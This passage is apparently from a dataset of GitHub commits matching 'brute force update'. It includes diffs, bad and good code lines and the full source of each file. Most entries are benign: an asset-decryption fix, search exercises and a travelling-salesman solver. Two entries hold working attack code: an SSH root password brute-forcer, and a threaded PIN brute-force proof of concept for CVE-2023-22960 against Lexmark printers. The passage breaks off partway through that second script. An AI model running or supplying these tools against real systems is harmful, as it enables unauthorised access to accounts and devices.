index=self.decrypt_byte(data, offset, index) byteHigh=curByte >> 4 byteLow=curByte & 0xF if byteHigh==0xF: b=0xFF while b==0xFF: b, offset, index=self.decrypt_byte(data, offset, index) byteHigh +=b offset +=byteHigh if offset < remaining: _, offset, index=self.decrypt_byte(data, offset, index) _, offset, index=self.decrypt_byte(data, offset, index) if byteLow==0xF: b=0xFF while b==0xFF: b, offset, index=self.decrypt_byte(data, offset, index) return offset ","sourceWithComments":"# based on: https:\/\/github.com\/Razmoth\/PGRStudio\/blob\/master\/AssetStudio\/PGR\/PGR.cs\nfrom typing import Tuple, Union\n\nfrom ..streams import EndianBinaryReader\n\nUNITY3D_SIGNATURE = b\"#$unity3dchina!@\"\nDECRYPT_KEY: bytes = None\n\n\ndef set_assetbundle_decrypt_key(key: Union[bytes, str]):\n    if isinstance(key, str):\n        key = key.encode(\"utf-8\", \"surrogateescape\")\n    if len(key) != 16:\n        raise ValueError(\n            f\"AssetBundle Key length is wrong. It should be 16 bytes and now is {len(key)} bytes.\"\n        )\n    global DECRYPT_KEY\n    DECRYPT_KEY = key\n\n\ndef read_vector(reader: EndianBinaryReader) -> Tuple[bytes, bytes]:\n    data = reader.read_bytes(0x10)\n    key = reader.read_string_to_null().encode(\"utf-8\", \"surrogateescape\")\n\n    return data, key\n\n\ndef decrypt_key(key: bytes, data: bytes, keybytes: bytes):\n    from Crypto.Cipher import AES\n\n    key = AES.new(keybytes, AES.MODE_ECB).encrypt(key)\n    return bytes(x ^ y for x, y in zip(data, key))\n\n\ndef to_uint4_array(source: bytes, offset: int = 0):\n    buffer = bytearray(len(source) * 2)\n    for j in range(len(source)):\n        buffer[j * 2] = source[offset + j] >> 4\n        buffer[j * 2 + 1] = source[offset + j] & 15\n    return buffer\n\n\nclass ArchiveStorageDecryptor:\n    unknown_1: int\n    index: bytes\n    substitute: bytes = bytes(0x10)\n\n    def __init__(self, reader: EndianBinaryReader) -> None:\n        if DECRYPT_KEY is None:\n            raise LookupError(\n                \"The BundleFile is encrypted, but no key was provided!\\nYou can set the key via UnityPy.set_assetbundle_decrypt_key(key)\"\n            )\n        self.unknown_1 = reader.read_u_int()\n\n        # read vector data\/key vectors\n        self.data, self.key = read_vector(reader)\n        self.data_sig, self.key_sig = read_vector(reader)\n\n        signature = decrypt_key(self.key_sig, self.data_sig, DECRYPT_KEY)\n        if signature != UNITY3D_SIGNATURE:\n            raise Exception(f\"Invalid signature {signature} != {UNITY3D_SIGNATURE}\")\n\n        data = decrypt_key(self.key, self.data, DECRYPT_KEY)\n        data = to_uint4_array(data)\n        self.index = data[:0x10]\n        self.substitute = bytes(\n            data[0x10 + i * 4 + j] for j in range(4) for i in range(4)\n        )\n\n    def decrypt_block(self, data: bytes, index: int):\n        offset = 0\n        size = len(data)\n        data = bytearray(data)\n        view = memoryview(data)\n        while offset < len(data):\n            offset += self.decrypt(view[offset:], index, size - offset)\n            index += 1\n        return data\n\n    def decrypt_byte(self, view: bytearray, offset: int, index: int):\n        b = (\n            self.substitute[((index >> 2) & 3) + 4]\n            + self.substitute[index & 3]\n            + self.substitute[((index >> 4) & 3) + 8]\n            + self.substitute[(index % 256 >> 6) + 12]\n        )\n        view[offset] = (\n            (self.index[view[offset] & 0xF] - b) & 0xF\n            | 0x10 * (self.index[view[offset] >> 4] - b)\n        ) % 256\n        b = view[offset]\n        return b, offset + 1, index + 1\n\n    def decrypt(self, data: bytearray, index: int, remaining: int):\n        offset = 0\n\n        curByte, offset, index = self.decrypt_byte(data, offset, index)\n        byteHigh = curByte >> 4\n        byteLow = curByte & 0xF\n\n        if byteHigh == 0xF:\n            b = 0xFF\n            while b == 0xFF:\n                b, offset, index = self.decrypt_byte(data, offset, index)\n                byteHigh += b\n\n        offset += byteHigh\n\n        if offset < remaining:\n            _, offset, index = self.decrypt_byte(data, offset, index)\n            _, offset, index = self.decrypt_byte(data, offset, index)\n            if byteLow == 0xF:\n                b = 0xFF\n                while b == 0xFF:\n                    b, offset, index = self.decrypt_byte(data, offset, index)\n\n        return offset\n"}},"msg":"Fix UnityCN Decryption + brute-force function (#168)\n\n* fix UnityCN decryption\r\n\r\n* ArchiveStorageManager - add brute-force function and better error description.\r\n\r\n* Update __init__.py"}},"https:\/\/github.com\/domini04\/StudyDev":{"bf40314a9850e0be9eaae969c5b419e8086f824f":{"url":"https:\/\/api.github.com\/repos\/domini04\/StudyDev\/commits\/bf40314a9850e0be9eaae969c5b419e8086f824f","html_url":"https:\/\/github.com\/domini04\/StudyDev\/commit\/bf40314a9850e0be9eaae969c5b419e8086f824f","message":"Brute Force Update","sha":"bf40314a9850e0be9eaae969c5b419e8086f824f","keyword":"brute force update","diff":"diff --git a\/Data-Structures\/10. Brute Force Algorithms\/Search.py b\/Data-Structures\/10. Brute Force Algorithms\/Search.py\nindex 0ba2bfa..bb4c360 100644\n--- a\/Data-Structures\/10. Brute Force Algorithms\/Search.py\t\n+++ b\/Data-Structures\/10. Brute Force Algorithms\/Search.py\t\n@@ -1,5 +1,78 @@\n-def linear_search(search_list, target_value) :\n-  for i,j in enumerate(search_list):\n-    if j == target_value:\n-      return i\n-  return \"{} Not found\".format(target_value)\n\\ No newline at end of file\n+# I. Basic Linear Search\n+  # def linear_search(search_list, target_value) :\n+  #   for i,j in enumerate(search_list):\n+  #     if j == target_value:\n+  #       return i\n+  #   return \"{} Not found\".format(target_value)\n+\n+def linear_search(search_list, target_value):\n+  for idx in range(len(search_list)):\n+    if search_list[idx] == target_value:\n+      return idx\n+  raise ValueError(\"{0} not in list\".format(target_value))\n+\n+number_list = [ 10, 14, 19, 26, 27, 31, 33, 35, 42, 44]\n+target_number = 33\n+\n+try :\n+  print(linear_search(number_list, target_number))\n+except ValueError as e:\n+  print(e)\n+\n+\n+target_number = 100\n+try :\n+  print(linear_search(number_list, target_number))\n+except ValueError as e:\n+  print(e)\n+\n+\n+# II. Finding Duplicate Values\n+\n+ #pseudo code\n+# For each element in the searchList\n+  # if element equal target value then\n+    # Add its index to a list of occurrences\n+# if the list of occurrences is empty\n+  # raise ValueError\n+# otherwise\n+  # return the list occurrences\n+\n+def linear_search_all(search_list, target_value):\n+  occurrences = []\n+  for idx in range(len(search_list)):\n+    if search_list[idx] == target_value:\n+      occurrences.append(idx)\n+  if not occurrences:\n+    raise ValueError(\"{0} not in list\".format(target_value))\n+  return occurrences\n+\n+\n+tour_locations = [ \"New York City\", \"Los Angeles\", \"Bangkok\", \"Istanbul\", \"London\", \"New York City\", \"Toronto\"]\n+target_city = \"New York City\"\n+\n+try :\n+  print(linear_search_all(tour_locations, target_city))\n+except ValueError as e:\n+  print(e)\n+\n+# III. Finding the Maximum Value\n+\n+  # pseudo code\n+  # Create a variable called max_value_index    \n+# Set max_value_index to the index of the first element of the search list\n+     # For each element in the search list\n+          # if element is greater than the element at max_value_index\n+               # Set max_value_index equal to the index of the element\n+# return max_value_index\n+\n+def linear_search_max(search_list):\n+  max_value_index = 0\n+  for idx in range(1, len(search_list)):\n+    if search_list[idx] > search_list[max_value_index]:\n+      max_value_index = idx\n+  return max_value_index\n+\n+test_scores = [88, 93, 75, 100, 80, 67, 71, 92, 90, 83]\n+print(linear_search_max(test_scores))\n+\ndiff --git a\/Data-Structures\/11. Trees\/TreeNode.py b\/Data-Structures\/11. Trees\/TreeNode.py\nnew file mode 100644\nindex 0000000..fe390b9\n--- \/dev\/null\n+++ b\/Data-Structures\/11. Trees\/TreeNode.py\t\n@@ -0,0 +1,8 @@\n+class TreeNode\n+    def __init__(self, val):\n+        print(\"TreeNode.__init__({0})\".format(val))\n+        self.val = val\n+        self.left = None\n+        self.right = None\n+\n+Seed = TreeNode(\"Shin\")\n\\ No newline at end of file\n","files":{"\/Data-Structures\/10. Brute Force Algorithms\/Search.py":{"changes":[{"diff":"\n-def linear_search(search_list, target_value) :\n-  for i,j in enumerate(search_list):\n-    if j == target_value:\n-      return i\n-  return \"{} Not found\".format(target_value)\n\\ No newline at end of file\n+# I. Basic Linear Search\n+  # def linear_search(search_list, target_value) :\n+  #   for i,j in enumerate(search_list):\n+  #     if j == target_value:\n+  #       return i\n+  #   return \"{} Not found\".format(target_value)\n+\n+def linear_search(search_list, target_value):\n+  for idx in range(len(search_list)):\n+    if search_list[idx] == target_value:\n+      return idx\n+  raise ValueError(\"{0} not in list\".format(target_value))\n+\n+number_list = [ 10, 14, 19, 26, 27, 31, 33, 35, 42, 44]\n+target_number = 33\n+\n+try :\n+  print(linear_search(number_list, target_number))\n+except ValueError as e:\n+  print(e)\n+\n+\n+target_number = 100\n+try :\n+  print(linear_search(number_list, target_number))\n+except ValueError as e:\n+  print(e)\n+\n+\n+# II. Finding Duplicate Values\n+\n+ #pseudo code\n+# For each element in the searchList\n+  # if element equal target value then\n+    # Add its index to a list of occurrences\n+# if the list of occurrences is empty\n+  # raise ValueError\n+# otherwise\n+  # return the list occurrences\n+\n+def linear_search_all(search_list, target_value):\n+  occurrences = []\n+  for idx in range(len(search_list)):\n+    if search_list[idx] == target_value:\n+      occurrences.append(idx)\n+  if not occurrences:\n+    raise ValueError(\"{0} not in list\".format(target_value))\n+  return occurrences\n+\n+\n+tour_locations = [ \"New York City\", \"Los Angeles\", \"Bangkok\", \"Istanbul\", \"London\", \"New York City\", \"Toronto\"]\n+target_city = \"New York City\"\n+\n+try :\n+  print(linear_search_all(tour_locations, target_city))\n+except ValueError as e:\n+  print(e)\n+\n+# III. Finding the Maximum Value\n+\n+  # pseudo code\n+  # Create a variable called max_value_index    \n+# Set max_value_index to the index of the first element of the search list\n+     # For each element in the search list\n+          # if element is greater than the element at max_value_index\n+               # Set max_value_index equal to the index of the element\n+# return max_value_index\n+\n+def linear_search_max(search_list):\n+  max_value_index = 0\n+  for idx in range(1, len(search_list)):\n+    if search_list[idx] > search_list[max_value_index]:\n+      max_value_index = idx\n+  return max_value_index\n+\n+test_scores = [88, 93, 75, 100, 80, 67, 71, 92, 90, 83]\n+print(linear_search_max(test_scores))\n+","add":78,"remove":5,"filename":"\/Data-Structures\/10. Brute Force Algorithms\/Search.py","badparts":["def linear_search(search_list, target_value) :","  for i,j in enumerate(search_list):","    if j == target_value:","      return i","  return \"{} Not found\".format(target_value)"],"goodparts":["def linear_search(search_list, target_value):","  for idx in range(len(search_list)):","    if search_list[idx] == target_value:","      return idx","  raise ValueError(\"{0} not in list\".format(target_value))","number_list = [ 10, 14, 19, 26, 27, 31, 33, 35, 42, 44]","target_number = 33","try :","  print(linear_search(number_list, target_number))","except ValueError as e:","  print(e)","target_number = 100","try :","  print(linear_search(number_list, target_number))","except ValueError as e:","  print(e)","def linear_search_all(search_list, target_value):","  occurrences = []","  for idx in range(len(search_list)):","    if search_list[idx] == target_value:","      occurrences.append(idx)","  if not occurrences:","    raise ValueError(\"{0} not in list\".format(target_value))","  return occurrences","tour_locations = [ \"New York City\", \"Los Angeles\", \"Bangkok\", \"Istanbul\", \"London\", \"New York City\", \"Toronto\"]","target_city = \"New York City\"","try :","  print(linear_search_all(tour_locations, target_city))","except ValueError as e:","  print(e)","def linear_search_max(search_list):","  max_value_index = 0","  for idx in range(1, len(search_list)):","    if search_list[idx] > search_list[max_value_index]:","      max_value_index = idx","  return max_value_index","test_scores = [88, 93, 75, 100, 80, 67, 71, 92, 90, 83]","print(linear_search_max(test_scores))"]}],"source":"\ndef linear_search(search_list, target_value): for i,j in enumerate(search_list): if j==target_value: return i return \"{} Not found\".format(target_value) ","sourceWithComments":"def linear_search(search_list, target_value) :\n  for i,j in enumerate(search_list):\n    if j == target_value:\n      return i\n  return \"{} Not found\".format(target_value)"}},"msg":"Brute Force Update"}},"https:\/\/github.com\/Palwisha-18\/python_programming_exercises":{"2cca7a7fedf3ab19e67c3e3ed54cf20347b76620":{"url":"https:\/\/api.github.com\/repos\/Palwisha-18\/python_programming_exercises\/commits\/2cca7a7fedf3ab19e67c3e3ed54cf20347b76620","html_url":"https:\/\/github.com\/Palwisha-18\/python_programming_exercises\/commit\/2cca7a7fedf3ab19e67c3e3ed54cf20347b76620","message":"update brute force function name","sha":"2cca7a7fedf3ab19e67c3e3ed54cf20347b76620","keyword":"brute force update","diff":"diff --git a\/two_sum.py b\/two_sum.py\nindex 6ee25f3..193ab2c 100644\n--- a\/two_sum.py\n+++ b\/two_sum.py\n@@ -4,7 +4,7 @@\n \"\"\"\n \n \n-def two_sum(arr: list, target: int) -> list:\n+def two_sum_brute_force(arr: list, target: int) -> list:\n     size_of_arr = len(arr)\n     for i in range(0, size_of_arr):\n         for j in range(i + 1, size_of_arr):\n@@ -14,4 +14,4 @@ def two_sum(arr: list, target: int) -> list:\n \n \n if __name__ == \"__main__\":\n-    assert two_sum([1, 2, 3, 4, 5], 8) == [2, 4]\n+    assert two_sum_brute_force([1, 2, 3, 4, 5], 8) == [2, 4]\n","files":{"\/two_sum.py":{"changes":[{"diff":"\n \"\"\"\n \n \n-def two_sum(arr: list, target: int) -> list:\n+def two_sum_brute_force(arr: list, target: int) -> list:\n     size_of_arr = len(arr)\n     for i in range(0, size_of_arr):\n         for j in range(i + 1, size_of_arr):\n","add":1,"remove":1,"filename":"\/two_sum.py","badparts":["def two_sum(arr: list, target: int) -> list:"],"goodparts":["def two_sum_brute_force(arr: list, target: int) -> list:"]},{"diff":"\n \n \n if __name__ == \"__main__\":\n-    assert two_sum([1, 2, 3, 4, 5], 8) == [2, 4]\n+    assert two_sum_brute_force([1, 2, 3, 4, 5], 8) == [2, 4]\n","add":1,"remove":1,"filename":"\/two_sum.py","badparts":["    assert two_sum([1, 2, 3, 4, 5], 8) == [2, 4]"],"goodparts":["    assert two_sum_brute_force([1, 2, 3, 4, 5], 8) == [2, 4]"]}],"source":"\n\"\"\" Given an array of integers nums and an integer target, return indices of the two numbers such that they add up to target. \"\"\" def two_sum(arr: list, target: int) -> list: size_of_arr=len(arr) for i in range(0, size_of_arr): for j in range(i +1, size_of_arr): if(arr[i] +arr[j])==target: return[i, j] return[] if __name__==\"__main__\": assert two_sum([1, 2, 3, 4, 5], 8)==[2, 4] ","sourceWithComments":"\"\"\"\nGiven an array of integers nums and an integer target,\nreturn indices of the two numbers such that they add up to target.\n\"\"\"\n\n\ndef two_sum(arr: list, target: int) -> list:\n    size_of_arr = len(arr)\n    for i in range(0, size_of_arr):\n        for j in range(i + 1, size_of_arr):\n            if (arr[i] + arr[j]) == target:\n                return [i, j]\n    return []\n\n\nif __name__ == \"__main__\":\n    assert two_sum([1, 2, 3, 4, 5], 8) == [2, 4]\n"}},"msg":"update brute force function name"}},"https:\/\/github.com\/diegosope\/Python101ForHackers":{"97a7046fcab7878b0a79eb181452d23685a62fd3":{"url":"https:\/\/api.github.com\/repos\/diegosope\/Python101ForHackers\/commits\/97a7046fcab7878b0a79eb181452d23685a62fd3","html_url":"https:\/\/github.com\/diegosope\/Python101ForHackers\/commit\/97a7046fcab7878b0a79eb181452d23685a62fd3","message":"update brute-force.py","sha":"97a7046fcab7878b0a79eb181452d23685a62fd3","keyword":"brute force update","diff":"diff --git a\/brute-force.py b\/brute-force.py\nindex ef11576..52c19cb 100644\n--- a\/brute-force.py\n+++ b\/brute-force.py\n@@ -6,7 +6,7 @@\n attempts = 0 \n \n \n-with open(\"top-20-common-SSH-passwords.txt\", \"r\") as password_list: ~#Choose your wordlist\n+with open(\"top-20-common-SSH-passwords.txt\", \"r\") as password_list: #Choose your wordlist\n \tfor password in password_list:\n \t\tpassword = password.strip(\"\\n\")\n \t\ttry:\n","files":{"\/brute-force.py":{"changes":[{"diff":"\n attempts = 0 \n \n \n-with open(\"top-20-common-SSH-passwords.txt\", \"r\") as password_list: ~#Choose your wordlist\n+with open(\"top-20-common-SSH-passwords.txt\", \"r\") as password_list: #Choose your wordlist\n \tfor password in password_list:\n \t\tpassword = password.strip(\"\\n\")\n \t\ttry:\n","add":1,"remove":1,"filename":"\/brute-force.py","badparts":["with open(\"top-20-common-SSH-passwords.txt\", \"r\") as password_list: ~#Choose your wordlist"],"goodparts":["with open(\"top-20-common-SSH-passwords.txt\", \"r\") as password_list: #Choose your wordlist"]}],"source":"\nfrom pwn import * import paramiko host=\"127.0.0.1\" username=\"root\" attempts=0 with open(\"top-20-common-SSH-passwords.txt\", \"r\") as password_list: ~ \tfor password in password_list: \t\tpassword=password.strip(\"\\n\") \t\ttry: \t\t\tprint(\"[{}] Attempting password: '{}'!\".format(attempts, password)) \t\t\tresponse=ssh(host=host, user=username, password=password, timeout=1) \t\t\tif response.connected(): \t\t\t\tprint(\"[>] Valid password found: '{}\".format(password)) \t\t\t\tresponse.close() \t\t\t\tbreak \t\t\tresponse.close() \t\texcept paramiko.ssh_exception.AuthenticationException: \t\t\tprint(\"[X] Invalid password!\") \t\tattempts +=1 ","sourceWithComments":"from pwn import *\nimport paramiko\n\nhost = \"127.0.0.1\" #Choose your target IP\nusername = \"root\" #Choose your target Username\nattempts = 0 \n\n\nwith open(\"top-20-common-SSH-passwords.txt\", \"r\") as password_list: ~#Choose your wordlist\n\tfor password in password_list:\n\t\tpassword = password.strip(\"\\n\")\n\t\ttry:\n\t\t\tprint(\"[{}] Attempting password: '{}'!\".format(attempts, password))\n\t\t\tresponse = ssh(host=host, user=username, password=password, timeout=1)\n\t\t\tif response.connected():\n\t\t\t\tprint(\"[>] Valid password found: '{}\".format(password))\n\t\t\t\tresponse.close()\n\t\t\t\tbreak\n\t\t\tresponse.close()\n\t\texcept paramiko.ssh_exception.AuthenticationException:\n\t\t\tprint(\"[X] Invalid password!\")\n\t\tattempts += 1"}},"msg":"update brute-force.py"}},"https:\/\/github.com\/nizar-masmoudi\/pycord":{"e6934cbfadf0fd1b9f15cba7e0bc1988c0eb998b":{"url":"https:\/\/api.github.com\/repos\/nizar-masmoudi\/pycord\/commits\/e6934cbfadf0fd1b9f15cba7e0bc1988c0eb998b","html_url":"https:\/\/github.com\/nizar-masmoudi\/pycord\/commit\/e6934cbfadf0fd1b9f15cba7e0bc1988c0eb998b","message":"Update Brute force to static fit method","sha":"e6934cbfadf0fd1b9f15cba7e0bc1988c0eb998b","keyword":"brute force update","diff":"diff --git a\/src\/algorithms\/exhaustive.py b\/src\/algorithms\/exhaustive.py\nindex 6b0625b..872b554 100644\n--- a\/src\/algorithms\/exhaustive.py\n+++ b\/src\/algorithms\/exhaustive.py\n@@ -4,11 +4,10 @@\n \n #####################################! Brute Force !#####################################  \n class BruteForce:\n-  def __init__(self) -> None:\n-    pass\n-  def fit(self, costmat: Union[np.array, list]) -> Tuple[list, float]:\n+  @staticmethod\n+  def fit(costmat: Union[np.array, list]) -> Tuple[list, float]:\n     '''Run the brute force algorithm. This method automatically uses hamiltionian cycles with node of index 0 as departure station.\n-    Note: In hamiltonian cycles, departure stations do not matter. \n+    Note: In hamiltonian cycles, departure stations do not matter.\n \n     Parameters:\n     costmat (Union[np.array, list]): Cost matrix\ndiff --git a\/src\/test_data.py b\/src\/test_data.py\nindex 5aa1068..d05a8c8 100644\n--- a\/src\/test_data.py\n+++ b\/src\/test_data.py\n@@ -40,5 +40,6 @@ def draw(data):\n data = np.random.randint(0, 100, size = num_nodes*2).reshape(-1, 2)\n costmat = distance_matrix(data, data)\n \n-alg = BruteForce()\n-opt_path, opt_cost = alg.fit(costmat)\n\\ No newline at end of file\n+opt_path, opt_cost = BruteForce.fit(costmat)\n+print(opt_path, opt_cost)\n+draw(data)\n\\ No newline at end of file\n","files":{"\/src\/algorithms\/exhaustive.py":{"changes":[{"diff":"\n \n #####################################! Brute Force !#####################################  \n class BruteForce:\n-  def __init__(self) -> None:\n-    pass\n-  def fit(self, costmat: Union[np.array, list]) -> Tuple[list, float]:\n+  @staticmethod\n+  def fit(costmat: Union[np.array, list]) -> Tuple[list, float]:\n     '''Run the brute force algorithm. This method automatically uses hamiltionian cycles with node of index 0 as departure station.\n-    Note: In hamiltonian cycles, departure stations do not matter. \n+    Note: In hamiltonian cycles, departure stations do not matter.\n \n     Parameters:\n     costmat (Union[np.array, list]): Cost matrix","add":3,"remove":4,"filename":"\/src\/algorithms\/exhaustive.py","badparts":["  def __init__(self) -> None:","    pass","  def fit(self, costmat: Union[np.array, list]) -> Tuple[list, float]:","    Note: In hamiltonian cycles, departure stations do not matter. "],"goodparts":["  @staticmethod","  def fit(costmat: Union[np.array, list]) -> Tuple[list, float]:","    Note: In hamiltonian cycles, departure stations do not matter."]}],"source":"\nimport numpy as np from itertools import permutations from typing import Union, Tuple class BruteForce: def __init__(self) -> None: pass def fit(self, costmat: Union[np.array, list]) -> Tuple[list, float]: '''Run the brute force algorithm. This method automatically uses hamiltionian cycles with node of index 0 as departure station. Note: In hamiltonian cycles, departure stations do not matter. Parameters: costmat(Union[np.array, list]): Cost matrix Returns: Tuple[list, float]: Optimal path with its total cost(nodes are identified by their positions w.r. to the cost matrix) ''' inter_stations=list(range(len(costmat)))[1:] combinations=[[0] +list(combination) +[0] for combination in permutations(inter_stations)] costs=[np.sum(np.diagonal(costmat[combination][:, combination], offset=1)) for combination in combinations] opt_path=combinations[np.argmin(costs)] opt_cost=np.min(costs) return opt_path, opt_cost ","sourceWithComments":"import numpy as np\nfrom itertools import permutations\nfrom typing import Union, Tuple\n\n#####################################! Brute Force !#####################################  \nclass BruteForce:\n  def __init__(self) -> None:\n    pass\n  def fit(self, costmat: Union[np.array, list]) -> Tuple[list, float]:\n    '''Run the brute force algorithm. This method automatically uses hamiltionian cycles with node of index 0 as departure station.\n    Note: In hamiltonian cycles, departure stations do not matter. \n\n    Parameters:\n    costmat (Union[np.array, list]): Cost matrix\n\n    Returns:\n    Tuple[list, float]: Optimal path with its total cost (nodes are identified by their positions w.r. to the cost matrix)\n    '''\n    inter_stations = list(range(len(costmat)))[1:]\n    combinations = [[0] + list(combination) + [0] for combination in permutations(inter_stations)]\n    costs = [np.sum(np.diagonal(costmat[combination][:, combination], offset = 1)) for combination in combinations]\n    opt_path = combinations[np.argmin(costs)]\n    opt_cost = np.min(costs)\n    return opt_path, opt_cost\n    "},"\/src\/test_data.py":{"changes":[{"diff":"\n data = np.random.randint(0, 100, size = num_nodes*2).reshape(-1, 2)\n costmat = distance_matrix(data, data)\n \n-alg = BruteForce()\n-opt_path, opt_cost = alg.fit(costmat)\n\\ No newline at end of file\n+opt_path, opt_cost = BruteForce.fit(costmat)\n+print(opt_path, opt_cost)\n+draw(data)\n\\ No newline at end of file\n","add":3,"remove":2,"filename":"\/src\/test_data.py","badparts":["alg = BruteForce()","opt_path, opt_cost = alg.fit(costmat)"],"goodparts":["opt_path, opt_cost = BruteForce.fit(costmat)","print(opt_path, opt_cost)","draw(data)"]}],"source":"\n import numpy as np from algorithms.exhaustive import BruteForce from scipy.spatial import distance_matrix import networkx as nx import matplotlib.pyplot as plt def draw(data): G=nx.Graph() for i in range(len(data)): G.add_node(i) nx.draw_networkx(G, pos={i: data[i] for i in range(len(data))}) plt.show() num_nodes=5 data=np.random.randint(0, 100, size=num_nodes*2).reshape(-1, 2) costmat=distance_matrix(data, data) alg=BruteForce() opt_path, opt_cost=alg.fit(costmat) ","sourceWithComments":"# import numpy as np\n# from scipy.spatial import distance_matrix\n# from algorithms.exhaustive import BruteForce\n# from algorithms.localsearch import OPT\n# from algorithms.evolutionary import Genetic\n\n# num_nodes = 5\n# data = np.random.randint(0, 100, size = num_nodes*2).reshape(-1, 2)\n# costmat = distance_matrix(data, data)\n\n# bf = BruteForce()\n# bf.fit(costmat)\n# print(bf.path)\n# print(bf.cost)\n\n# opt = OPT()\n# opt.fit(costmat)\n# print(opt.path)\n\n# ga = Genetic(10, .2, 1)\n# ga.fit(None, max_generations = 20, costmat = costmat, verbose = True)\n# print(ga.get_fittest(costmat))\n\nimport numpy as np\nfrom algorithms.exhaustive import BruteForce\nfrom scipy.spatial import distance_matrix\nimport networkx as nx\nimport matplotlib.pyplot as plt\n\ndef draw(data):\n    # Create Graph\n    G = nx.Graph()\n    for i in range(len(data)):\n      G.add_node(i)\n    # Draw Graph\n    nx.draw_networkx(G, pos = {i: data[i] for i in range(len(data))})\n    plt.show()\n\nnum_nodes = 5\ndata = np.random.randint(0, 100, size = num_nodes*2).reshape(-1, 2)\ncostmat = distance_matrix(data, data)\n\nalg = BruteForce()\nopt_path, opt_cost = alg.fit(costmat)"}},"msg":"Update Brute force to static fit method"}},"https:\/\/github.com\/t3l3machus\/CVE-2023-22960":{"74bbc5527c6ea3fc2fd583d02693ac43b36d2395":{"url":"https:\/\/api.github.com\/repos\/t3l3machus\/CVE-2023-22960\/commits\/74bbc5527c6ea3fc2fd583d02693ac43b36d2395","html_url":"https:\/\/github.com\/t3l3machus\/CVE-2023-22960\/commit\/74bbc5527c6ea3fc2fd583d02693ac43b36d2395","message":"Update lexmark-brute-force-pins.py","sha":"74bbc5527c6ea3fc2fd583d02693ac43b36d2395","keyword":"brute force update","diff":"diff --git a\/lexmark-brute-force-pins.py b\/lexmark-brute-force-pins.py\nindex e59c0af..865d8c4 100644\n--- a\/lexmark-brute-force-pins.py\n+++ b\/lexmark-brute-force-pins.py\n@@ -67,7 +67,7 @@ def bruteforce(pin):\n \t\n \tthread_limiter.acquire()\n \tpin = pin.strip()\n-\tauthId = randint(-100000, 1000000)\n+\tauthId = randint(-1000000, 1000000)\n \tdata = '{\"authtype\" : 3, \"authId\" : ' + str(authId) + ', \"creds\": {\"pin\" : \"' + pin + '\"}}'\n \tpost_req_data = {'data':data, 'lang':'en'}\n \t\n","files":{"\/lexmark-brute-force-pins.py":{"changes":[{"diff":"\n \t\n \tthread_limiter.acquire()\n \tpin = pin.strip()\n-\tauthId = randint(-100000, 1000000)\n+\tauthId = randint(-1000000, 1000000)\n \tdata = '{\"authtype\" : 3, \"authId\" : ' + str(authId) + ', \"creds\": {\"pin\" : \"' + pin + '\"}}'\n \tpost_req_data = {'data':data, 'lang':'en'}\n \t\n","add":1,"remove":1,"filename":"\/lexmark-brute-force-pins.py","badparts":["\tauthId = randint(-100000, 1000000)"],"goodparts":["\tauthId = randint(-1000000, 1000000)"]}],"source":"\n import requests, threading, re, argparse from random import randint requests.packages.urllib3.disable_warnings() parser=argparse.ArgumentParser() parser.add_argument(\"-t\", \"--target\", action=\"store\", help=\"IP or domain name of the target. Use it to specify port as well(e.g. 192.168.0.56:8080)\", required=True) parser.add_argument(\"-P\", \"--protocol\", action=\"store\", help=\"HTTP or HTTPS.\", required=True) parser.add_argument(\"-p\", \"--pins-file\", action=\"store\", help=\"File containing a PINS list.\", required=True) args=parser.parse_args() MAIN='\\033[38;5;50m' SUCCESS='\\033[38;5;82m' FAIL='\\033[1;91m' END='\\033[0m' BOLD='\\033[1m' ORANGE='\\033[0;38;5;214m' GREEN='\\033[38;5;82m' MAIN_BULLET=f'[{MAIN}*{END}]' max_threads=80 thread_limiter=threading.BoundedSemaphore(max_threads) login_url=f'{args.protocol}:\/\/{args.target}\/webglue\/session\/create' headers={ \t'User-Agent': 'Mozilla\/5.0(X11; Linux x86_64; rv:102.0) Gecko\/20100101 Firefox\/102.0', \t'Accept': 'application\/json, text\/javascript, *\/*; q=0.01', \t'Accept-Language': 'en-US,en;q=0.5', \t'Accept-Encoding': 'gzip, deflate, br', \t'Content-Type': 'application\/x-www-form-urlencoded; charset=utf-8', \t'X-Requested-With': 'XMLHttpRequest', \t'Connection': 'keep-alive', \t'Cookie': 'lang=en; autoLogin=false', \t'Sec-Fetch-Dest': 'empty', \t'Sec-Fetch-Mode': 'cors', \t'Sec-Fetch-Site': 'same-origin' } def get_file_contents(path): \t \tf=open(path, 'r') \tcontents=f.readlines() \tf.close() \treturn contents \t \t pins=get_file_contents(args.pins_file) pins_count=len(pins) def bruteforce(pin): \t \tthread_limiter.acquire() \tpin=pin.strip() \tauthId=randint(-100000, 1000000) \tdata='{\"authtype\": 3, \"authId\": ' +str(authId) +', \"creds\":{\"pin\": \"' +pin +'\"}}' \tpost_req_data={'data':data, 'lang':'en'} \t \ttry:\t \t\tresponse=requests.post(url=login_url, data=post_req_data, verify=False, allow_redirects=False, headers=headers) \t\tcontent=response.content.decode()\t \t\tif re.search('sessionId', content):\t\t\t\t \t\t\tprint(f'Match:{GREEN}{pin}{END} ' +content) \t\t \t\telse: \t\t\tprint(f'{ORANGE}{pin}{END} ' +content) \texcept: \t\tprint(f'{FAIL}FAIL{END} Something went wrong.[status:{response.status_code}]') \t\t \tfinally: \t\tthread_limiter.release() def main(): \t \tprint(f'\\n{MAIN_BULLET} PoC for CVE-2023-22960 by t3l3machus(https:\/\/github.com\/t3l3machus)') \tprint(f'{MAIN_BULLET} Initiating PIN authentication brute force attack against:{login_url}') \tprint(f'{MAIN_BULLET} Number of PINs loaded:{pins_count}') \tprint(f'{MAIN_BULLET} Successful attempts will be logged below(if any):') \t\t \tfor pin in pins: \t\tthreading.Thread(target=bruteforce, args=(pin.strip(),)).start() if __name__=='__main__': \tmain() \t\t ","sourceWithComments":"#!\/usr\/bin\/env python3\n#\n# Author: Panagiotis Chartas (t3l3machus)\n# usage: lexmark-brute-force-pins.py -t TARGET -P PROTOCOL -p PINS_FILE [-h]\n#\n# https:\/\/github.com\/t3l3machus\n\nimport requests, threading, re, argparse\nfrom random import randint\nrequests.packages.urllib3.disable_warnings()\n\nparser = argparse.ArgumentParser()\n\nparser.add_argument(\"-t\", \"--target\", action=\"store\", help = \"IP or domain name of the target. Use it to specify port as well (e.g. 192.168.0.56:8080)\", required = True)\nparser.add_argument(\"-P\", \"--protocol\", action=\"store\", help = \"HTTP or HTTPS.\", required = True)\nparser.add_argument(\"-p\", \"--pins-file\", action=\"store\", help = \"File containing a PINS list.\", required = True)\n\nargs = parser.parse_args()\n\n# Colors\nMAIN = '\\033[38;5;50m'\nSUCCESS = '\\033[38;5;82m'\nFAIL = '\\033[1;91m'\nEND = 